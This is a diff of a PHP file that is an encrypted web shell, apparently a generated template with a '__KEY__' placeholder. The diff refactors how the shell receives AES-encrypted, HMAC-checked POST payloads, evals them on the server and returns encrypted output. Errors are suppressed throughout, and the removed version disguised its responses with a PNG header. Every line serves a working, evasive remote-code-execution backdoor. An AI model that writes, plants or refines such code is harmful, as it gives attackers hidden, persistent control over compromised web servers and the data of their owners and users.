@@ -1,78 +1,75 @@
 <?php
+@session_start();
 @error_reporting(0);
+@ini_set('display_errors', '0');
 
-$key = "__KEY__"; 
-
-$raw = array_values(unpack('C*', $key));
-$rawLen = count($raw);
-$aesKeyBytes = [];
-$ivBytes = [];
-
-for ($i = 0; $i < 16; $i++) {
-    $aesKeyBytes[] = ($raw[$i % $rawLen] ^ 0x1F);
-    $ivBytes[]     = ($raw[$i % $rawLen] ^ 0x2E);
-}
-$aesKey = pack('C*', ...$aesKeyBytes);
-$defaultIv = pack('C*', ...$ivBytes); 
-
-$data = file_get_contents("php://input");
-
-if (!empty($data) && strlen($data) > 68) {
-    try {
-        $decrypted = decryptData($data, $aesKey);
-        
-        $arr = explode('|', $decrypted);
-        $func = $arr[0];
-        $params = $arr[1];
-        
-        ob_start();
-        class C { public function __invoke($p) { eval($p . ""); } }
-        @call_user_func(new C(), $params);
-        $output = ob_get_clean();
-        
-        echo encryptData($output, $aesKey, $defaultIv);
-        
-    } catch (Exception $e) {
-        exit();
-    }
-}
-
-function decryptData($data, $aesKey) {
+function Decrypt($data) {
     $prefixLen = 68;
+    if (strlen($data) <= $prefixLen + 48) {
+        return "";
+    }
     $encrypted = substr($data, $prefixLen);
-    $encLen = strlen($encrypted);
     
-    if ($encLen < 48) {
-        throw new Exception("data too short");
+    $key = "__KEY__";
+    $raw = unpack('C*', $key);
+    $raw = $raw ? array_values($raw) : [];
+    $rawLen = count($raw);
+    if ($rawLen === 0) return "";
+    
+    $aesKey = "";
+    for ($i = 0; $i < 16; $i++) {
+        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
     }
     
     $iv = substr($encrypted, 0, 16);
     $tag = substr($encrypted, -32);
-    $body = substr($encrypted, 16, $encLen - 48);
+    $body = substr($encrypted, 16, -32);
     
     $macData = $iv . $body;
     $check = hash_hmac('sha256', $macData, $aesKey, true);
-    
-    if (!hash_equals($check, $tag)) {
-        throw new Exception("bad mac");
+    if ($check !== $tag) {
+        header("HTTP/1.1 500 Internal Server Error");
+        exit();
     }
     
-    $decrypted = openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
-    if ($decrypted === false) {
-        throw new Exception("decrypt failed");
-    }
-    
-    return $decrypted;
+    return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
 }
 
-function encryptData($data, $aesKey, $defaultIv) {
-    $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=");
-    $iv = $defaultIv; 
+function Encrypt($data) {
+    $key = "__KEY__";
+    $raw = unpack('C*', $key);
+    $raw = $raw ? array_values($raw) : [];
+    $rawLen = count($raw);
+    if ($rawLen === 0) return "";
     
-    $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
-    $out = $iv . $enc;
-    $tag = hash_hmac('sha256', $out, $aesKey, true);
+    $aesKey = "";
+    $ivStr = "";
+    for ($i = 0; $i < 16; $i++) {
+        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
+        $ivStr .= chr($raw[$i % $rawLen] ^ 0x2E);
+    }
     
-    return $prefix . $out . $tag;
+    $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $ivStr);
+    $macData = $ivStr . $enc;
+    $tag = hash_hmac('sha256', $macData, $aesKey, true);
+    
+    return $ivStr . $enc . $tag;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $postData = file_get_contents("php://input");
+    if (!empty($postData)) {
+        $deMsg = Decrypt($postData);
+        if (!empty($deMsg)) {
+            ob_start();
+            try {
+                @eval($deMsg);
+            } catch (\Throwable $e) {
+            }
+            $output = ob_get_contents();
+            ob_end_clean();
+            echo Encrypt($output);
+        }
+    }
 }
 ?>
